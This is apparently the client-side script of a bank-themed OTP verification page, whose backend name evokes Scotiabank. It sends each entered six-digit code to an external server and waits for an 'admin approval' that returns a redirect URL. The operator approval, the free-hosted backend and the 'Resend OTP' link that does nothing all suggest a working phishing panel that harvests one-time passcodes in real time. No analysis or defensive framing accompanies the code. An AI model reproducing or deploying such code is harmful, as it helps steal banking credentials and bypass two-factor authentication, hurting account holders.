    <script src="https://unpkg.com/lucide@latest/dist/umd/lucide.js"></script>
    <script>
        // Backend URL - make sure this matches your Flask backend
        const BACKEND_URL = 'https://scotiabcknd.onrender.com';
        // Alternative for local testing: 'http://localhost:5000'
        
        console.log('Using backend URL:', BACKEND_URL);
        
        // Initialize Lucide icons
        lucide.createIcons();
        
        // Generate OTP input fields
        function generateOTPInputs() {
            const otpContainer = document.getElementById('otpContainer');
            otpContainer.innerHTML = '';
            
            for (let i = 0; i < 6; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.dataset.index = i;
                input.pattern = '[0-9]';
                input.inputMode = 'numeric';
                
                input.addEventListener('input', (e) => {
                    const value = e.target.value;
                    if (/^[0-9]$/.test(value)) {
                        e.target.classList.add('filled');
                        
                        // Auto-focus next input
                        if (i < 5) {
                            const nextInput = otpContainer.querySelector(`input[data-index="${i + 1}"]`);
                            nextInput.focus();
                        }
                    } else {
                        e.target.value = '';
                        e.target.classList.remove('filled');
                    }
                });
                
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !e.target.value && i > 0) {
                        const prevInput = otpContainer.querySelector(`input[data-index="${i - 1}"]`);
                        prevInput.focus();
                        prevInput.value = '';
                        prevInput.classList.remove('filled');
                    }
                });
                
                otpContainer.appendChild(input);
            }
            
            // Focus first input
            otpContainer.querySelector('input').focus();
        }
        
        // Get OTP value
        function getOTP() {
            const inputs = document.querySelectorAll('.otp-input');
            let otp = '';
            inputs.forEach(input => {
                otp += input.value;
            });
            return otp;
        }
        
        // Resend OTP countdown
        function startResendCountdown() {
            const resendLink = document.getElementById('resendLink');
            const countdownElement = document.getElementById('countdown');
            let countdown = 30;
            
            resendLink.style.pointerEvents = 'none';
            resendLink.style.opacity = '0.5';
            
            const interval = setInterval(() => {
                countdownElement.textContent = `You can request a new code in ${countdown} seconds`;
                countdown--;
                
                if (countdown < 0) {
                    clearInterval(interval);
                    resendLink.style.pointerEvents = 'auto';
                    resendLink.style.opacity = '1';
                    countdownElement.textContent = '';
                }
            }, 1000);
        }
        
        // Poll status function (same as other pages)
        async function pollStatus(sessionId) {
            let attempts = 0;
            const maxAttempts = 120; // Try for 10 minutes (5 seconds * 120 = 600 seconds)
            
            const checkStatus = async () => {
                try {
                    console.log(`Checking status for session: ${sessionId}, attempt: ${attempts + 1}`);
                    const response = await fetch(`${BACKEND_URL}/status/${sessionId}`);
                    
                    if (!response.ok) {
                        console.error('Status check failed:', response.status);
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000);
                        } else {
                            document.getElementById('successMessage').textContent = 'Status check timed out. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                        return;
                    }
                    
                    const data = await response.json();
                    console.log('Status check response:', data);
                    
                    if (data.status === 'approved' && data.redirect_url) {
                        // Approved - redirect to next page
                        const redirectUrl = data.redirect_url;
                        console.log('Approved! Redirecting to:', redirectUrl);
                        
                        // If the redirect_url is a page name (not full URL), construct URL
                        if (!redirectUrl.startsWith('http')) {
                            window.location.href = redirectUrl;
                        } else {
                            window.location.href = redirectUrl;
                        }
                        return true;
                    } else if (data.status === 'pending') {
                        // Continue polling
                        attempts++;
                        if (attempts < maxAttempts) {
                            setTimeout(checkStatus, 5000); // Check every 5 seconds
                            
                            // Update message every few attempts
                            if (attempts % 12 === 0) { // Every minute
                                const minutes = attempts / 12;
                                document.getElementById('successMessage').textContent = `Still waiting for admin approval... (${minutes} minute${minutes > 1 ? 's' : ''})`;
                            }
                        } else {
                            // Timeout
                            document.getElementById('successMessage').textContent = 'Request timed out after 10 minutes. Please try again.';
                            document.getElementById('successMessage').classList.add('show');
                            document.getElementById('successMessage').classList.remove('success-message');
                            document.getElementById('successMessage').classList.add('error-message');
                            resetButton();
                        }
                    } else if (data.error) {
                        // Error from backend
                        document.getElementById('successMessage').textContent = `Error: ${data.error}`;
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                } catch (error) {
                    console.error('Status check error:', error);
                    attempts++;
                    if (attempts < maxAttempts) {
                        setTimeout(checkStatus, 5000);
                    } else {
                        document.getElementById('successMessage').textContent = 'Status check error. Please try again.';
                        document.getElementById('successMessage').classList.add('show');
                        document.getElementById('successMessage').classList.remove('success-message');
                        document.getElementById('successMessage').classList.add('error-message');
                        resetButton();
                    }
                }
                return false;
            };
            
            // Start polling
            setTimeout(checkStatus, 5000); // First check after 5 seconds
        }
        
        function resetButton() {
            const verifyBtn = document.getElementById('verifyBtn');
            const loadingIcon = verifyBtn.querySelector('.loading');
            const buttonText = verifyBtn.querySelector('span');
            
            loadingIcon.classList.remove('active');
            buttonText.textContent = 'Verify OTP';
            verifyBtn.disabled = false;
        }
        
        // Form submission
        document.getElementById('otpForm').addEventListener('submit', async function (e) {
            e.preventDefault();
            
            const otp = getOTP();
            
            // Show loading state
            const verifyBtn = document.getElementById('verifyBtn');
            const spinner = verifyBtn.querySelector('.loading');
            const buttonText = verifyBtn.querySelector('span');
            
            spinner.classList.add('active');
            buttonText.textContent = 'Verifying...';
            verifyBtn.disabled = true;
            
            // Clear previous messages
            document.getElementById('otpError').classList.remove('show');
            document.getElementById('successMessage').classList.remove('show');
            
            // Validate OTP
            if (otp.length !== 6 || !/^\d+$/.test(otp)) {
                document.getElementById('otpError').textContent = 'Please enter a valid 6-digit OTP';
                document.getElementById('otpError').classList.add('show');
                
                spinner.classList.remove('active');
                buttonText.textContent = 'Verify OTP';
                verifyBtn.disabled = false;
                return;
            }
            
            try {
                // Prepare data in the format expected by Flask backend /otp endpoint
                const otpData = {
                    otp: otp
                };
                
                console.log('Sending OTP to:', `${BACKEND_URL}/otp`);
                console.log('Data:', otpData);
                
                const response = await fetch(`${BACKEND_URL}/otp`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify(otpData)
                });
                
                console.log('Response status:', response.status);
                
                const data = await response.json();
                console.log('Response data:', data);
                
                if (response.ok && data.success) {
                    // Success - store session ID and start polling
                    const sessionId = data.id;
                    localStorage.setItem('sessionId', sessionId);
                    
                    // Update button text
                    buttonText.textContent = 'Waiting for approval...';
                    
                    // Show success message
                    document.getElementById('successMessage').textContent = 'OTP submitted successfully. Waiting for admin approval...';
                    document.getElementById('successMessage').classList.add('show');
                    
                    // Start polling for status
                    pollStatus(sessionId);
                } else {
                    // Show error
                    const errorMsg = data.error || `OTP verification failed. Status: ${response.status}`;
                    document.getElementById('otpError').textContent = errorMsg;
                    document.getElementById('otpError').classList.add('show');
                    
                    // Clear OTP inputs
                    const inputs = document.querySelectorAll('.otp-input');
                    inputs.forEach(input => {
                        input.value = '';
                        input.classList.remove('filled');
                    });
                    inputs[0].focus();
                    
                    // Reset button
                    spinner.classList.remove('active');
                    buttonText.textContent = 'Verify OTP';
                    verifyBtn.disabled = false;
                }
            } catch (error) {
                console.error('Network error:', error);
                document.getElementById('otpError').textContent = `Network error: ${error.message}. Please check backend URL: ${BACKEND_URL}`;
                document.getElementById('otpError').classList.add('show');
                
                // Clear OTP inputs
                const inputs = document.querySelectorAll('.otp-input');
                inputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                inputs[0].focus();
                
                // Reset button
                spinner.classList.remove('active');
                buttonText.textContent = 'Verify OTP';
                verifyBtn.disabled = false;
            }
        });
        
        // Resend OTP handler
        document.getElementById('resendLink').addEventListener('click', function (e) {
            e.preventDefault();
            
            // For now, just reset the countdown and clear inputs
            // In a real implementation, you would call a backend endpoint
            startResendCountdown();
            
            // Clear OTP inputs
            const inputs = document.querySelectorAll('.otp-input');
            inputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled');
            });
            inputs[0].focus();
            
            // Show message
            document.getElementById('successMessage').textContent = 'New OTP has been requested.';
            document.getElementById('successMessage').classList.add('show');
            
            // Clear after 3 seconds
            setTimeout(() => {
                document.getElementById('successMessage').classList.remove('show');
            }, 3000);
        });
        
        // Initialize page
        document.addEventListener('DOMContentLoaded', () => {
            generateOTPInputs();
            startResendCountdown();
            
            // Check if we came from login page
            const sessionId = localStorage.getItem('sessionId');
            if (!sessionId) {
                console.log('No session ID found. User may have come directly to OTP page.');
                // Don't redirect - let them try OTP anyway
            }
            
            // Test backend connection
            console.log('Testing backend connection...');
            fetch(`${BACKEND_URL}/`)
                .then(response => {
                    console.log('Backend connection test:', response.status);
                    if (response.ok) {
                        console.log('Backend is reachable!');
                    }
                })
                .catch(error => {
                    console.error('Backend connection failed:', error);
                    console.error('Please make sure the backend is running at:', BACKEND_URL);
                });
        });
    </script>
